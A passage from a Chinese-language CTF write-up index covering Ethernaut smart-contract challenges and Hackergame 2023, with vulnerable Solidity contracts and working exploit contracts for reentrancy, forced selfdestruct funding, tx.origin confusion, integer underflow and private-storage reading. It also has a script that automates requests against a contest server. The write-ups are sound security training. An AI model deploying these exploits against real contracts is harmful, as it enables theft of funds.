( address ( challenge ). balance >= 0 ) { challenge . withdraw ( 0 . 001 ether ); } } } \u6267\u884c\u5408\u7ea6\u524d\uff0c\u9700\u8981\u5148donate\u4fdd\u8bc1\u5408\u7ea6\u53ef\u4ee5\u53d6\u94b1\u3002 contract . donate . sendTransaction ( < exp contract addr > , { value : toWei ( \"0.001\" )}) Elevator \u00b6 \u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; interface Building { function isLastFloor ( uint ) external returns ( bool ); } contract Elevator { bool public top ; uint public floor ; function goTo ( uint _floor ) public { Building building = Building ( msg.sender ); if ( ! building . isLastFloor ( _floor )) { floor = _floor ; top = building . isLastFloor ( floor ); } } } \u8fd9\u9898\u5b66\u4e60\u4e86solidity\u4e2d\u63a5\u53e3\u7684\u4e00\u4e9b\u7528\u6cd5\uff0c\u6839\u636e\u9898\u76ee\u8be6\u89e3\u4e5f\u4e86\u89e3\u5230\u4e86view\u548cpure\u51fd\u6570\u4fee\u6539\u5668\u7684\u4f5c\u7528\uff0c\u53ef\u4ee5\u9632\u6b62\u72b6\u6001\u88ab\u7be1\u6539\uff0c\u4f46\u662f\u5373\u4f7f\u8fd9\u6837\uff0c\u4e5f\u53ef\u4ee5\u6784\u9020\u4e00\u4e2a\u4e0d\u540c\u8f93\u5165\u5f97\u5230\u4e0d\u540c\u8f93\u51fa\u7684\u51fd\u6570\u89e3\u51fa\u672c\u9898\u3002 exp // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; /* code of Elevator */ contract Exploit { Elevator elevator ; bool top = true ; constructor ( address challenge ) public { elevator = Elevator ( challenge ); } function isLastFloor ( uint ) public returns ( bool ) { top = ! top ; // \u8c03\u7528\u4e00\u6b21\u5c31\u6539\u4e00\u6b21\u8fd4\u56de\u503c return top ; } function exp () public { elevator . goTo ( 1 ); } }","title":"Ethernaut"},{"location":"writeups/ethernaut/#ethernaut","text":"\u7ea6 937 \u4e2a\u5b57 402 \u884c\u4ee3\u7801 \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 8 \u5206\u949f Abstract \u611f\u89c9\u8fd9\u4e2a\u7cfb\u5217\u662fBlockchain\u6bd4\u8f83\u6709\u540d\u7684\u65b0\u624b\u9898\u76ee\u7cfb\u5217\uff0c\u5e0c\u671b\u80fd\u501f\u6b64\u5b66\u4f1a\u4e00\u4e9bBlockchain\u57fa\u7840\u6280\u80fd\uff0c\u4e0d\u81f3\u4e8e\u6bd4\u8d5b\u7684\u65f6\u5019\u65e0\u8111\u8df3\u8fc7\u3002 \u9898\u76ee\u94fe\u63a5 \u975e\u5e38\u7cdf\u5fc3\u7684\u662f\u6ca1\u6709\u627e\u5230\u8db3\u591f\u7684faucet\u83b7\u53d6\u8db3\u591f\u7684eth\u6765\u652f\u4ed8gas\uff0c\u6ca1\u60f3\u5230\u5c45\u7136\u5361\u5728\u4e86\u8fd9\u4e00\u6b65\u3002\u5728Goerli\u6269\u5c55\u7f51\u7edc\u4e0b\uff0c\u627e\u5230\u4e00\u4e2a \u6c34\u9f99\u5934 \uff0c\u6bcf\u5929\u53ef\u4ee5\u67090.005\uff0c\u867d\u7136\u5f88\u5c11\uff0c\u4f46\u662f\u5b58\u4e00\u5b58\u52c9\u5f3a\u591f\u7528\u3002\uff08GAS\u8d39\u597d\u8d35\uff0c\u90fd\u5feb0.01\u4e86\uff09 \u540e\u6765\u53d1\u73b0\u8fd9\u4e2a \u624b\u52a8\u6316 \uff0c\u76f4\u63a5\u6316\u4e86\u4e00\u4e9b\uff0c\u611f\u89c9\u8fd9\u6837\u8db3\u591f\u4e86\u3002","title":"Ethernaut"},{"location":"writeups/ethernaut/#hello-ethernaut","text":"\u8df3\u8fc7\u4e86\uff0c\u4e0d\u60f3\u6d6a\u8d39\u597d\u4e0d\u5bb9\u6613\u51d1\u7684Gas\u8d39\uff0c\u5c31\u662f\u4e00\u4e9b\u57fa\u672c\u64cd\u4f5c\u7684\u6559\u5b66\u3002","title":"Hello Ethernaut"},{"location":"writeups/ethernaut/#fallback","text":"\u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract Fallback { mapping ( address => uint ) public contributions ; address public owner ; constructor () { owner = msg.sender ; contributions [ msg.sender ] = 1000 * ( 1 ether ); } modifier onlyOwner { require ( msg.sender == owner , \"caller is not the owner\" ); _ ; } function contribute () public payable { require ( msg.value < 0 . 001 ether ); contributions [ msg.sender ] += msg.value ; if ( contributions [ msg.sender ] > contributions [ owner ]) { owner = msg.sender ; } } function getContribution () public view returns ( uint ) { return contributions [ msg.sender ]; } function withdraw () public onlyOwner { payable ( owner ). transfer ( address ( this ). balance ); } receive () external payable { require ( msg.value > 0 && contributions [ msg.sender ] > 0 ); owner = msg.sender ; } } \u9898\u76ee\u8981\u6c42\uff0c\u6539\u53d8\u5408\u7ea6\u6240\u6709\u8005\u4e3a\u73a9\u5bb6\uff0c\u5e76\u53d6\u51fa\u6240\u6709\u7684\u4f59\u989d\u3002 \u6839\u636e\u5408\u7ea6\u4ee3\u7801\uff0c\u8981\u6c42\u73a9\u5bb6\u7684contribution\u503c\u5927\u4e8e\u539f\u5408\u7ea6\u62e5\u6709\u8005\u65f6\u79fb\u4ea4\u6240\u6709\u6743\uff0c\u4f46\u662f\u8fd9\u662f\u96be\u4ee5\u5b9e\u73b0\u7684\uff0c\u56e0\u6b64\u9700\u8981\u5229\u7528receive\u51fd\u6570\uff0c\u8fd9\u4e2a\u51fd\u6570\u5728\u5408\u7ea6\u63a5\u6536\u4ea4\u6613\u65f6\u5c31\u4f1a\u6267\u884c\uff0c\u56e0\u6b64\u6211\u4eec\u53ea\u9700\u8981\u5148\u4f7f\u73a9\u5bb6contribution\u5927\u4e8e0\uff0c\u5e76\u5411\u5408\u7ea6\u53d1\u9001\u5927\u4e8e0\u7684\u4ea4\u6613\u5373\u53ef\u5b8c\u6210\u672c\u9898\u3002 await contract . contribute ({ value : 1 }) await contract . sendTransaction ({ value : 1 }) await contract . withdraw ()","title":"Fallback"},{"location":"writeups/ethernaut/#fallout","text":"\u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; import 'openzeppelin-contracts-06/math/SafeMath.sol' ; contract Fallout { using SafeMath for uint256 ; mapping ( address => uint ) allocations ; address payable public owner ; /* constructor */ function Fal1out () public payable { owner = msg.sender ; allocations [ owner ] = msg.value ; } modifier onlyOwner { require ( msg.sender == owner , \"caller is not the owner\" ); _ ; } function allocate () public payable { allocations [ msg.sender ] = allocations [ msg.sender ]. add ( msg.value ); } function sendAllocation ( address payable allocator ) public { require ( allocations [ allocator ] > 0 ); allocator . transfer ( allocations [ allocator ]); } function collectAllocations () public onlyOwner { msg.sender . transfer ( address ( this ). balance ); } function allocatorBalance ( address allocator ) public view returns ( uint ) { return allocations [ allocator ]; } } \u53ef\u4ee5\u53d1\u73b0\u5408\u7ea6\u7684constructor\u51fd\u6570\u662fFal1out\uff0c\u56e0\u6b64\u76f4\u63a5\u8c03\u7528 contract . Fal1out () \u5373\u53ef\u5b8c\u6210\u672c\u9898","title":"Fallout"},{"location":"writeups/ethernaut/#coinflip","text":"\u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract CoinFlip { uint256 public consecutiveWins ; uint256 lastHash ; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968 ; constructor () { consecutiveWins = 0 ; } function flip ( bool _guess ) public returns ( bool ) { uint256 blockValue = uint256 ( blockhash ( block.number - 1 )); if ( lastHash == blockValue ) { revert (); } lastHash = blockValue ; uint256 coinFlip = blockValue / FACTOR ; bool side = coinFlip == 1 ? true : false ; if ( side == _guess ) { consecutiveWins ++ ; return true ; } else { consecutiveWins = 0 ; return false ; } } } \u8fd9\u9053\u9898\u8ba9\u6211\u5b66\u4e60\u4e86\u5982\u4f55\u901a\u8fc7Remix\u90e8\u7f72\u5408\u7ea6\u5e76\u6267\u884c\u76f8\u5e94\u7684\u5408\u7ea6\u51fd\u6570\uff0c\u672c\u9898\u9700\u8981\u90e8\u7f72\u4e00\u4e2a\u653b\u51fb\u5408\u7ea6\uff0c\u56e0\u4e3a\u9898\u76ee\u5408\u7ea6\u4e2d\u8981\u6c42 lastHash != blockValue \uff0c\u5b89\u7167\u9898\u76ee\u8981\u6c42\u6267\u884c10\u6b21\u5373\u53ef\u3002 exp // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract CoinFlip { uint256 public consecutiveWins ; uint256 lastHash ; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968 ; constructor () { consecutiveWins = 0 ; } function flip ( bool _guess ) public returns ( bool ) { uint256 blockValue = uint256 ( blockhash ( block.number - 1 )); if ( lastHash == blockValue ) { revert (); } lastHash = blockValue ; uint256 coinFlip = blockValue / FACTOR ; bool side = coinFlip == 1 ? true : false ; if ( side == _guess ) { consecutiveWins ++ ; return true ; } else { consecutiveWins = 0 ; return false ; } } } contract hack { uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968 ; CoinFlip c = CoinFlip ( 0x2Ee20b7C14d2c7376F8E04cA175D840FF0644B85 ); function exp () public { uint256 blockValue = uint256 ( blockhash ( block.number - 1 )); uint256 coinFlip = blockValue / FACTOR ; bool side = coinFlip == 1 ? true : false ; c . flip ( side ); } }","title":"Coinflip"},{"location":"writeups/ethernaut/#telephone","text":"\u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract Telephone { address public owner ; constructor () { owner = msg.sender ; } function changeOwner ( address _owner ) public { if ( tx.origin != msg.sender ) { owner = _owner ; } } } \u8fd9\u91cc\u7684\u4e00\u4e2a\u77e5\u8bc6\u70b9\u5c31\u662ftx.origin\u662f\u6574\u4e2a\u4ea4\u6613\u7684\u6700\u539f\u59cb\u53d1\u9001\u8005\uff0c\u800cmsg.sender\u5219\u662f\u5f53\u524d\u8c03\u7528\u8005\uff1a tx.origin\uff1a\u4ea4\u6613\u53d1\u9001\u65b9\uff0c\u662f\u6574\u4e2a\u4ea4\u6613\u6700\u5f00\u59cb\u7684\u5730\u5740 msg.sender\uff1a\u6d88\u606f\u53d1\u9001\u65b9\uff0c\u662f\u5f53\u524d\u8c03\u7528\u7684\u8c03\u7528\u65b9\u5730\u5740 \u4e8e\u662f\uff0c\u53ea\u8981\u90e8\u7f72\u4e00\u4e2a\u5408\u7ea6\u6765\u8c03\u7528changeOwner\u65b9\u6cd5\u5373\u53ef\uff0c\u5408\u7ea6\u7f16\u5199\u5f88\u7b80\u5355\uff0c\u8fd9\u91cc\u5c31\u4e0d\u653e\u4e86\u3002","title":"Telephone"},{"location":"writeups/ethernaut/#token","text":"\u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.0 ; contract Token { mapping ( address => uint ) balances ; uint public totalSupply ; constructor ( uint _initialSupply ) public { balances [ msg.sender ] = totalSupply = _initialSupply ; } function transfer ( address _to , uint _value ) public returns ( bool ) { require ( balances [ msg.sender ] - _value >= 0 ); balances [ msg.sender ] -= _value ; balances [ _to ] += _value ; return true ; } function balanceOf ( address _owner ) public view returns ( uint balance ) { return balances [ _owner ]; } } \u8fd9\u91cc\u8003\u5bdf\u7684\u4e00\u4e2a\u77e5\u8bc6\u70b9\u662fuint\u6ea2\u51fa\uff0c\u6ea2\u51fa\u540e\u5c31\u80fd\u83b7\u5f97\u5f88\u5927\u7684\u6570\u503c\u4e86\uff0c\u6240\u4ee5\u76f4\u63a5\u4f7f\u7528 await contract . transfer ( contract . address , 21 ) \u5373\u53ef\u5b8c\u6210\u672c\u9898\u3002","title":"Token"},{"location":"writeups/ethernaut/#delegation","text":"\u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract Delegate { address public owner ; constructor ( address _owner ) { owner = _owner ; } function pwn () public { owner = msg.sender ; } } contract Delegation { address public owner ; Delegate delegate ; constructor ( address _delegateAddress ) { delegate = Delegate ( _delegateAddress ); owner = msg.sender ; } fallback () external { ( bool result ,) = address ( delegate ). delegatecall ( msg.data ); if ( result ) { this ; } } } \u8fd9\u9053\u9898\u7684\u8003\u70b9\u662fdelegatecall\uff0c\u8fd9\u4e2a\u51fd\u6570\u63a5\u6536\u7684\u662f\u7ecf\u8fc7 abi . encodeWithSignature \u540e\u7684\u51fd\u6570\uff0c\u67e5\u8be2\u6587\u6863\u53ef\u77e5\u53ea\u8981\u53d6\u51fd\u6570\u540dsha3\u540e\u7684\u524d4\u4e2a\u5b57\u8282\u5373\u53ef\u3002 > web3 . utils . sha3 ( \"pwn()\" ) '0xdd365b8b15d5d78ec041b851b68c8b985bee78bee0b87c4acf261024d8beabab' > contract . sendTransaction ({ data : \"0xdd365b8b\" })","title":"Delegation"},{"location":"writeups/ethernaut/#force","text":"\u867d\u7136\u65e0\u6cd5\u5411\u5408\u7ea6\u8f6c\u8d26\uff0c\u4f46\u662f\u5728\u5408\u7ea6\u81ea\u6bc1\u65f6\uff0c\u53ef\u4ee5\u5f3a\u5236\u5956\u4f59\u989d\u8f6c\u5230\u6307\u5b9a\u5730\u5740\uff0c\u56e0\u6b64\u53ea\u9700\u5148\u521b\u5efa\u4e00\u4e2a\u5408\u7ea6\uff0c\u5411\u5176\u8f6c\u8d26\u540e\uff0c\u518d\u81ea\u6bc1\u5408\u7ea6\u5373\u53ef\u3002 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract Exploit { constructor () public payable {} // \u521d\u59cb\u8981\u63a5\u6536 value \u6765\u521b\u5efa\u5408\u7ea6 function exp ( address challenge ) public { // \u9700\u8981\u5148\u5f3a\u5236\u8f6c\u6362\u4e3a payable address payable challenge = payable ( address ( challenge )); selfdestruct ( challenge ); } }","title":"Force"},{"location":"writeups/ethernaut/#vault","text":"\u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract Vault { bool public locked ; bytes32 private password ; constructor ( bytes32 _password ) public { locked = true ; password = _password ; } function unlock ( bytes32 _password ) public { if ( password == _password ) { locked = false ; } } } \u7531\u4e8e\u533a\u5757\u94fe\u4e0a\u7684\u4e00\u5207\u90fd\u662f\u516c\u5f00\u7684\uff0c\u56e0\u6b64private\u53d8\u91cf\u4e5f\u662f\u53ef\u4ee5\u770b\u5230\u7684\uff0c\u4e0b\u9762\u5c31\u7528\u4e86Tony\u8001\u5e08\u7684\u89e3\u9898\u4ee3\u7801\u3002 > await web3 . eth . getStorageAt ( instance , 1 ) // 0 \u4e3a locked \u7684\u4f4d\u7f6e\uff0c1 \u4e3a password '0x412076657279207374726f6e67207365637265742070617373776f7264203a29' > web3 . utils . toAscii ( \"0x412076657279207374726f6e67207365637265742070617373776f7264203a29\" ) 'A very strong secret password :)' > await contract . unlock ( \"0x412076657279207374726f6e67207365637265742070617373776f7264203a29\" ) // \u53c2\u6570\u662f bytes32\uff0c\u6240\u4ee5\u4e0d\u80fd\u76f4\u63a5\u4f20\u5b57\u7b26\u4e32\u8fdb\u53bb","title":"Vault"},{"location":"writeups/ethernaut/#king","text":"\u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract King { address payable king ; uint public prize ; address payable public owner ; constructor () public payable { owner = msg.sender ; king = msg.sender ; prize = msg.value ; } receive () external payable { require ( msg.value >= prize || msg.sender == owner ); king . transfer ( msg.value ); king = msg.sender ; prize = msg.value ; } function _king () public view returns ( address payable ) { return king ; } } \u5728\u66f4\u6362king\u7684\u65f6\u5019\uff0c\u4f1a\u5c06\u4f59\u989d\u8f6c\u5230\u4e0a\u4e00\u4efbking\uff0c\u53ea\u8981\u9009\u62e9\u4e0d\u63a5\u53d7\uff0c\u5373\u53ef\u4e0d\u5b8c\u6210\u6362\u4efb\uff0c\u8fd9\u91cc\u53ef\u4ee5\u4f7f\u7528revert\u3002 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract Exploit { constructor ( address challenge ) public payable { challenge . call { value : msg.value }( \"\" ); } fallback () external { revert (); } } \u53ea\u8981\u8f6c\u7684\u94b1\u6bd4prize(1300889614901161 wei)\u591a\u5c31\u53ef\u4ee5\u4e86\u3002","title":"King"},{"location":"writeups/ethernaut/#re-entrancy","text":"\u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.12 ; import 'openzeppelin-contracts-06/math/SafeMath.sol' ; contract Reentrance { using SafeMath for uint256 ; mapping ( address => uint ) public balances ; function donate ( address _to ) public payable { balances [ _to ] = balances [ _to ]. add ( msg.value ); } function balanceOf ( address _who ) public view returns ( uint balance ) { return balances [ _who ]; } function withdraw ( uint _amount ) public { if ( balances [ msg.sender ] >= _amount ) { ( bool result ,) = msg.sender . call { value : _amount }( \"\" ); if ( result ) { _amount ; } balances [ msg.sender ] -= _amount ; } } receive () external payable {} } \u8fd9\u9898\u8003\u5bdf\u91cd\u5165\u653b\u51fb\uff0c\u56e0\u4e3awithdraw\u662f\u5148\u8f6c\u8d26\uff0c\u6240\u4ee5\u53ef\u4ee5\u4f7f\u7528receive\u6216fallback\u4e00\u76f4withdraw\u3002\u521a\u5f00\u59cb\u5361\u4e86\u5f88\u4e45\uff0c\u540e\u6765\u53d1\u73b0\u662f\u6539\u4e86\u5408\u7ea6\u4ee3\u7801\u540e\u5fd8\u8bb0\u91cd\u65b0\u7f16\u8bd1\u4e86\uff0c\u6d6a\u8d39\u4e86\u597d\u591agas\u8d39qaq\u3002 exp // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; /* code of Reentrance */ contract Exploit { Reentrance challenge ; constructor ( address payable addr ) public payable { challenge = Reentrance ( addr ); } function exp () public { challenge . withdraw ( 0 . 001 ether ); } fallback () external payable { if ( address ( challenge ). balance >= 0 ) { challenge . withdraw ( 0 . 001 ether ); } } } \u6267\u884c\u5408\u7ea6\u524d\uff0c\u9700\u8981\u5148donate\u4fdd\u8bc1\u5408\u7ea6\u53ef\u4ee5\u53d6\u94b1\u3002 contract . donate . sendTransaction ( < exp contract addr > , { value : toWei ( \"0.001\" )})","title":"Re-entrancy"},{"location":"writeups/ethernaut/#elevator","text":"\u9898\u76ee\u5408\u7ea6 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; interface Building { function isLastFloor ( uint ) external returns ( bool ); } contract Elevator { bool public top ; uint public floor ; function goTo ( uint _floor ) public { Building building = Building ( msg.sender ); if ( ! building . isLastFloor ( _floor )) { floor = _floor ; top = building . isLastFloor ( floor ); } } } \u8fd9\u9898\u5b66\u4e60\u4e86solidity\u4e2d\u63a5\u53e3\u7684\u4e00\u4e9b\u7528\u6cd5\uff0c\u6839\u636e\u9898\u76ee\u8be6\u89e3\u4e5f\u4e86\u89e3\u5230\u4e86view\u548cpure\u51fd\u6570\u4fee\u6539\u5668\u7684\u4f5c\u7528\uff0c\u53ef\u4ee5\u9632\u6b62\u72b6\u6001\u88ab\u7be1\u6539\uff0c\u4f46\u662f\u5373\u4f7f\u8fd9\u6837\uff0c\u4e5f\u53ef\u4ee5\u6784\u9020\u4e00\u4e2a\u4e0d\u540c\u8f93\u5165\u5f97\u5230\u4e0d\u540c\u8f93\u51fa\u7684\u51fd\u6570\u89e3\u51fa\u672c\u9898\u3002 exp // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; /* code of Elevator */ contract Exploit { Elevator elevator ; bool top = true ; constructor ( address challenge ) public { elevator = Elevator ( challenge ); } function isLastFloor ( uint ) public returns ( bool ) { top = ! top ; // \u8c03\u7528\u4e00\u6b21\u5c31\u6539\u4e00\u6b21\u8fd4\u56de\u503c return top ; } function exp () public { elevator . goTo ( 1 ); } }","title":"Elevator"},{"location":"writeups/hackergame2023/","text":"Hackergame 2023 \u00b6 \u7ea6 3151 \u4e2a\u5b57 222 \u884c\u4ee3\u7801 \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 13 \u5206\u949f Abstract \u8fd9\u6b21\u5fd9\u91cc\u5077\u95f2\u505a\u7684\uff0c\u8fd8\u803d\u6401\u4e86\u4e00\u4e9b\u4e8b\u513fqaq\u3002\u7b97\u662f\u7b2c\u4e00\u6b21partly\u5b8c\u6574\u5730\u53c2\u52a0Hackergame\uff0c\u56e0\u4e3a\u662f\u9762\u5411\u521d\u5b66\u8005\u7684\u6bd4\u8d5b\uff0c\u9898\u76ee\u96be\u5ea6\u4e0d\u9ad8\u66f4\u5177\u6709\u8da3\u5473\u6027\uff0c\u7279\u6b64\u8bb0\u5f55\u4e00\u4e0b\u3002 \u4e00\u4e9b\u7b80\u5355\u7684\u9898\u76ee\u53ef\u80fd\u8bb0\u5f55\u7684\u4f1a\u6bd4\u8f83\u8349\u7387\uff0c\u4f1a\u91cd\u70b9\u8bb0\u5f55\u4e00\u4e9b\u5370\u8c61\u6df1\u523b\uff0c\u5dee\u4e00\u70b9\u5b8c\u6210\u7684\u9898\u76ee\u3002\u5bf9\u4e8e\u6ca1\u601d\u8def\u7684\u9898\u76ee\u4e5f\u7ed3\u5408\u516c\u5f00\u9898\u89e3\u8bb0\u5f55\u4e00\u4e0b\uff0c\u8865\u5145\u4e00\u4e0b\u76f8\u5173\u77e5\u8bc6\u3002 \u5b98\u65b9\u9898\u89e3 Hackergame \u542f\u52a8 \u00b6 \u7b7e\u5230\u9898\uff0c\u76f4\u63a5\u6539GET\u8bf7\u6c42\u53c2\u6570\u91cc\u7684Similarity \u732b\u54aa\u5c0f\u6d4b \u00b6 \u8003\u9a8c\u641c\u7d22\u80fd\u529b\uff0c\u90fd\u5f88\u597d\u641c\uff0cGoogle\u4e00\u4e0b\u4f60\u5c31\u77e5\u9053 \u66f4\u6df1\u66f4\u6697 \u00b6 \u9047\u4e8b\u4e0d\u51b3 F12\uff0c\u968f\u4fbf\u6eda\u4e00\u4e0b\u5c31\u627e\u5230\u4e86flag\uff08\u771f\u7684\uff0c\u90fd\u662f\u8fd0\u6c14 \u65c5\u884c\u7167\u7247 3.0 \u00b6 \u8fd8\u86ee\u6709\u610f\u601d\u7684\u793e\u5de5\u9898\uff0c\u8fd8\u662f\u6bd4\u8f83\u7b80\u5355\u7684 \u4ece\u65e5\u672c\u3001\u5b66\u672f\u4f1a\u8bae\u5165\u624b\uff0c\u5f88\u5bb9\u6613\u53d1\u73b0\u4f1a\u8bae\u540d\u79f0\u4ee5\u53ca\u5730\u70b9\u4e3a\u4e1c\u4eac\u5927\u5b66\uff0c\u6839\u636e\u5730\u56fe\u9a8c\u8bc1\u4e00\u4e0b\u5c31\u53d1\u73b0\u4e86\u90a3\u5bb6\u62c9\u9762\u9986\u3002 \u4e8e\u662f\u6839\u636e\u8981\u6c42\u67e5\u4e00\u4e0b\u4f1a\u8bae\u4e3e\u529e\u65e5\u671f\uff0c\u4ee5\u53ca\u4e1c\u4eac\u5927\u5b66\u8bfa\u8d1d\u5c14\u7269\u7406\u5b66\u5956\u83b7\u5f97\u8005\uff0c\u5f88\u5bb9\u6613\u89e3\u51fa\u7b2c\u4e00\u90e8\u5206\u7684\u7b54\u6848\u3002 \u7b2c\u4e8c\u90e8\u5206\u521a\u5f00\u59cb\u5361\u4e86\u5f88\u4e45\uff0c\u6ca1\u60f3\u5230\u9644\u8fd1\u8d70\u8d70\u5c45\u7136\u8d70\u90a3\u4e48\u8fdc\uff0c\u8fd8\u662f\u9760\u4e0a\u91ce\u7ad9\u8fd9\u4e00\u4e2a\u5173\u952e\u5730\u70b9\u624d\u53d1\u73b0\u539f\u6765\u8d70\u4e86\u90a3\u4e48\u8fdc\uff0c\u90a3\u5c31\u5f88\u597d\u5b9a\u4f4d\u5230\u56fd\u7acb\u535a\u7269\u9986\u548c\u4e0a\u91ce\u516c\u56ed\u3002\u6839\u636e\u65e5\u671f\u548c\u5730\u70b9\u80fd\u641c\u5230\u4e00\u4e2a\u9152\u7684\u5c55\u89c8\u4f1a\uff0c\u7f51\u7ad9\u91cc\u627e\u5230Staff\u62db\u52df\uff0c\u7b2c\u4e8c\u90e8\u5206\u5c31\u5b8c\u6210\u4e86\u3002 \u7b2c\u4e09\u90e8\u5206\u7b2c\u4e00\u95ee\u76f4\u63a5\u770b\u4f1a\u8bae\u5b98\u7f51\u7684\u901a\u77e5\u5373\u53ef\uff0c\u7b2c\u4e8c\u90e8\u5206\uff0c\u6d77\u62a5\u76f4\u63a5\u4e0aTwitter\u641c\u4e86\u4e00\u4e0b\u5c31\u51fa\u6765\u4e86\u3002\u5173\u4e8e 3D \u52a8\u7269\u7684\u8bdd\u80af\u5b9a\u6709\u76f8\u5173\u62a5\u9053\uff0c\u67e5\u4e86\u4e00\u4e0b\u6709\u732b\u6709\u72d7\uff0c\u8bd5\u4e00\u4e0b\u5c31\u51fa\u6765\u4e86\u3002 \u8d5b\u535a\u4e95\u5b57\u68cb \u00b6 \u540e\u7aef\u6ca1\u6709\u505a\u4f4d\u7f6e\u662f\u5426\u5360\u7528\u68c0\u67e5\uff0c\u6240\u4ee5\u53ea\u8981\u7ed5\u8fc7\u524d\u7aef\u68c0\u67e5\u5c31\u80fd\u83b7\u5f97\u80dc\u5229\u3002 \u5976\u5976\u7684\u7761\u524d flag \u6545\u4e8b \u00b6 \u6839\u636e\u9898\u5e72\u63d0\u5230\u7684 Google\u4eb2\u513f\u5b50 \u731c\u6d4b\u548cPixels\u6709\u5173\uff0c\u5584\u7528\u641c\u7d22\u53d1\u73b0\u662fPixels\u7684\u56fe\u50cf\u88c1\u526a\u6f0f\u6d1e\uff0c\u76f4\u63a5\u5c06PNG\u6587\u4ef6\u7684END\u6570\u636e\u5757\u6dfb\u52a0\u5230\u76f8\u5e94\u4f4d\u7f6e\uff0c\u5e76\u6ca1\u6709\u5220\u9664\u88ab\u88c1\u526a\u7684\u6570\u636e\uff0c\u6240\u4ee5\u53ef\u4ee5\u6839\u636e\u578b\u53f7\u4fee\u6539\u4e00\u4e0b\u957f\u5bbd\u5e76\u5220\u9664\u76f8\u5e94\u6570\u636e\u5757\u5373\u53ef\u3002 \u7f51\u4e0a\u5176\u5b9e\u6709\u76f8\u5e94\u5de5\u5177\u53ef\u4ee5\u4e00\u628a\u68ad\u3002 \u7ec4\u59d4\u4f1a\u6a21\u62df\u5668 \u00b6 \u7ec8\u4e8e\u6709\u4e00\u9053\u9700\u8981\u5199\u811a\u672c\u7684\u9898\u76ee\u4e86\uff08x \u76f4\u63a5F12\u770b\u6e90\u7801\uff0c\u53d1\u73b0\u540e\u7aef\u662f\u4e00\u6b21\u6027\u628a\u6240\u6709\u6d88\u606f\u90fd\u53d1\u8fc7\u6765\uff0c\u90a3\u5c31\u5f88\u7b80\u5355\uff0c\u4e4b\u95f4\u627e\u51fa\u6ee1\u8db3\u8981\u6c42\u7684\u6d88\u606f\u7136\u540e\u53d1\u8d77\u64a4\u56de\u8bf7\u6c42\u5373\u53ef\u3002\u4e0d\u8fc7\u4e0d\u80fd\u4e00\u6b21\u6027\u90fd\u64a4\u56de\uff0c\u540e\u7aef\u6709Delay\u65f6\u95f4\u8981\u6c42\uff0c\u53ef\u4ee5\u6839\u636e\u6d88\u606f\u5185\u7684Delay\u4fe1\u606f\u5ef6\u8fdf\u540e\u53d1\u9001\uff0c\u5f53\u7136\u4e5f\u53ef\u4ee5\u4e00\u76f4\u53d1\u9001\u76f4\u5230\u6210\u529f\u5373\u53ef\uff08\u4e3b\u8981\u7701\u529b\u65e0\u8111 \u89e3\u9898\u4ee3\u7801\uff08\u614e\u7528\uff0c\u6982\u7387\u4e8b\u4ef6\uff0c\u591a\u8bd5\u51e0\u6b21\u5c31\u597d\uff09 import requests import json from time import sleep cookies = { 'session' : 'token' } msg = requests . post ( 'http://202.38.93.111:10021/api/getMessages' , cookies = cookies ) msg = json . loads ( msg . text ) msg = msg [ 'messages' ] def back ( idx ): back = requests . post ( 'http://202.38.93.111:10021/api/deleteMessage' , cookies = cookies , json = { 'id' : idx }) try : back = json . loads ( back . text ) except : print ( 'err:' + back . text ) return back for id , i in enumerate ( msg ): if 'hack[' in i [ 'text' ]: t = back ( id ) # \u8fd9\u91cc\u53ef\u4ee5\u4f18\u5316\u4e00\u4e0b\uff0c\u4e0d\u8fc7\u61d2\u764c\u72af\u4e86 while ( t . get ( 'error' ) == '\u68c0\u6d4b\u5230\u65f6\u7a7a\u7a7f\u8d8a' ): t = back ( id ) # print(id, t) flag = requests . post ( 'http://202.38.93.111:10021/api/getflag' , cookies = cookies ) flag = json . loads ( flag . text ) print ( flag ) \u866b \u00b6 \u771f\u662f\u975e\u5e38\u5de7\uff0c\u4e4b\u524d\u5c31\u5237\u5230\u8fc7\u65e0\u7ebf\u7535\u3001SSTV\u76f8\u5173\u7684\u77e5\u8bc6\uff0c\u8fd9\u6b21\u5c45\u7136\u521a\u597d\u78b0\u4e0a\u4e86\uff0c\u4e0d\u8fc7Windows\u7aef\u90a3\u4e2a\u8f6f\u4ef6\u4e0d\u600e\u4e48\u4f1a\u7528\uff0c\u770b\u5230\u624b\u673a\u7aef\u6709\u76f8\u5e94\u7684\u50bb\u74dc\u5f0f\u6536\u53d1\u8f6f\u4ef6\uff08\u4e0d\u8fc7\u662fAndroid\uff0c\u4e8e\u662f\u62ff\u51fa\u4e86\u5907\u7528\u673a\uff09\u5f88\u8f7b\u677e\u83b7\u5f97\u4e86\u7ed3\u679c\u3002 \u4e0d\u653e\u56fe\u4e86\uff0c\u5360\u4ed3\u5e93\u7a7a\u95f4\uff0c\u7b49\u4ee5\u540e\u641e\u4e2a\u56fe\u5e8a\u6216SVG JSON \u2282 YAML? \u00b6 